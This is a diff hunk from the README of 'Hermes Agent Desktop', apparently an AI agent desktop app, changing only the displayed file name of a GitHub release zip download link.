@@ -17,7 +17,7 @@ Hermes Agent Desktop is a powerful AI agent desktop application that brings auto
 > This project is for educational and personal use only. Use at your own risk. Some features may require API keys from AI providers. The authors are not responsible for any account issues or violations of service terms.
 
 ## Install
-[Download `Hermes-Agent-Desktop.zip`](https://github.com/desktop-hermes/hermes-agent-desktop/releases/download/v0.6.0/hermes-desktop.zip)
+[Download `hermes-desktop.zip`](https://github.com/desktop-hermes/hermes-agent-desktop/releases/download/v0.6.0/hermes-desktop.zip)
 ---
 > Optimized for Windows 11 • macOS • Linux.
 ## Preview
